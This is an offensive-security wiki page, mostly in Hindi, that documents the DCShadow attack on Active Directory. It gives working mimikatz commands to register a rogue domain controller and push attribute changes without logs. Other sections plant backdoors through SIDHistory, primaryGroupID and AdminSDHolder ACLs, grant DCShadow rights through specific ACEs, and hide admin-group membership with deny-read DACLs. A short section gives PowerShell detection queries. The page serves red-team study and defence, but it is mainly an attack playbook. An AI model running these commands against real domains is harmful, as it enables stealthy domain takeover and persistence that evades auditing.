# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

यह AD में एक **new Domain Controller** रजिस्टर करता है और निर्दिष्ट ऑब्जेक्ट्स (SIDHistory, SPNs...) पर विशेषताएँ **push attributes** करने के लिए इसका उपयोग करता है, वह भी उन **modifications** से संबंधित किसी भी **logs** को छोड़े बिना। आपको **DA** privileges चाहिए और आपको **root domain** के अंदर होना चाहिए.\
ध्यान दें कि यदि आप गलत डेटा का उपयोग करते हैं, तो काफी बदसूरत logs दिखाई देंगे।

To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
ध्यान दें कि **`elevate::token`** `mimikatz1` session में काम नहीं करेगा क्योंकि उसने थ्रेड के विशेषाधिकार बढ़ा दिए, पर हमें **प्रक्रिया का विशेषाधिकार** बढ़ाना होगा.\
आप एक "LDAP" object भी चुन सकते हैं: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

आप DA से या निम्नलिखित न्यूनतम अनुमतियाँ रखने वाले user से परिवर्तन push कर सकते हैं:

- **domain object** में:
- _DS-Install-Replica_ (Domain में Replica जोड़ने/हटाने के लिए)
- _DS-Replication-Manage-Topology_ (Replication Topology को manage करने के लिए)
- _DS-Replication-Synchronize_ (Replication synchronization के लिए)
- **Sites object** (और इसके children) **Configuration container** में:
- _CreateChild_ और _DeleteChild_
- **computer which is registered as a DC** के object:
- _WriteProperty_ (Write नहीं)
- **target object**:
- _WriteProperty_ (Write नहीं)

आप इन विशेषाधिकारों को unprivileged user को देने के लिए [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) का उपयोग कर सकते हैं (ध्यान रखें कि इससे कुछ logs बनेगे)। यह DA privileges होने की तुलना में बहुत अधिक सीमित है।\
उदाहरण के लिए: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` इसका मतलब है कि username _**student1**_ जब मशीन _**mcorp-student1**_ पर लॉग ऑन होगा तो उसके पास object _**root1user**_ पर DCShadow permissions होंगे।

## DCShadow का उपयोग करके backdoors बनाना
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### प्राथमिक समूह दुरुपयोग, एन्यूमरेशन गैप और पहचान

- `primaryGroupID` समूह की `member` सूची से अलग attribute है। DCShadow/DSInternals इसे डायरेक्ट लिख सकते हैं (उदा., सेट करें `primaryGroupID=512` для **Domain Admins**) बिना on-box LSASS प्रवर्तन के, पर AD फिर भी उपयोगकर्ता को **स्थानांतरित** कर देता है: PGID बदलने पर हमेशा पहले के प्राथमिक समूह से सदस्यता हटा दी जाती है (किसी भी लक्षित समूह के लिए यही व्यवहार), इसलिए आप पुरानी प्राथमिक-समूह सदस्यता नहीं रख सकते।
- डिफ़ॉल्ट टूल्स उपयोगकर्ता को उनके वर्तमान प्राथमिक समूह से हटाने से रोकते हैं (`ADUC`, `Remove-ADGroupMember`), इसलिए PGID बदलने के लिए आम तौर पर डायरेक्ट directory लेखन की जरूरत होती है (DCShadow/`Set-ADDBPrimaryGroup`)।
- सदस्यता रिपोर्टिंग असंगत है:
  - **Includes** primary-group-derived members: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center।
  - **Omits** primary-group-derived members: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit द्वारा `member` निरीक्षण, `Get-ADUser <user> -Properties memberOf`।
  - Recursive checks primary-group सदस्यों को मिस कर सकते हैं यदि **प्राथमिक समूह स्वयं नेस्टेड है** (उदा., उपयोगकर्ता का PGID Domain Admins के अंदर किसी नेस्टेड समूह की ओर इशारा करता है); `Get-ADGroupMember -Recursive` या LDAP recursive फ़िल्टर वह उपयोगकर्ता वापस नहीं करेंगे जब तक recursion स्पष्ट रूप से primary groups को resolve न करे।
  - DACL ट्रिक्स: आक्रमणकर्ता उपयोगकर्ता पर `primaryGroupID` (या non-AdminSDHolder समूहों के लिए समूह `member` attribute) पर **deny ReadProperty** लागू कर सकते हैं, जिससे अधिकांश PowerShell क्वेरीज से प्रभावी सदस्यता छिप जाती है; `net group` फिर भी सदस्यता resolve कर लेगा। AdminSDHolder-प्रोटेक्टेड समूह ऐसे denies को रीसेट कर देंगे।

Detection/monitoring examples:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Cross-check privileged groups by comparing `Get-ADGroupMember` output with `Get-ADGroup -Properties member` or ADSI Edit to catch discrepancies introduced by `primaryGroupID` or hidden attributes.

## Shadowception - DCShadow को अनुमतियाँ दें DCShadow का उपयोग करके (कोई संशोधित अनुमतियों के लॉग नहीं)

हमें निम्न ACEs को हमारे उपयोगकर्ता की SID को अंत में जोड़ना होगा:

- डोमेन ऑब्जेक्ट पर:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- हमलावर कंप्यूटर ऑब्जेक्ट पर: `(A;;WP;;;UserSID)`
- लक्ष्य उपयोगकर्ता ऑब्जेक्ट पर: `(A;;WP;;;UserSID)`
- Configuration कंटेनर में Sites ऑब्जेक्ट पर: `(A;CI;CCDC;;;UserSID)`

किसी ऑब्जेक्ट का वर्तमान ACE पाने के लिए: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

ध्यान दें कि इस मामले में आपको **कई परिवर्तन** करने होंगे, सिर्फ एक नहीं। इसलिए, **mimikatz1 session** (RPC server) में प्रत्येक परिवर्तन के लिए वह पैरामीटर **`/stack`** इस्तेमाल करें जिसे आप करना चाहते हैं। इस तरह, आपको सिर्फ एक बार **`/push`** करने की जरूरत होगी ताकि rogue server में सभी रुके हुए परिवर्तन लागू हो जाएँ।

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
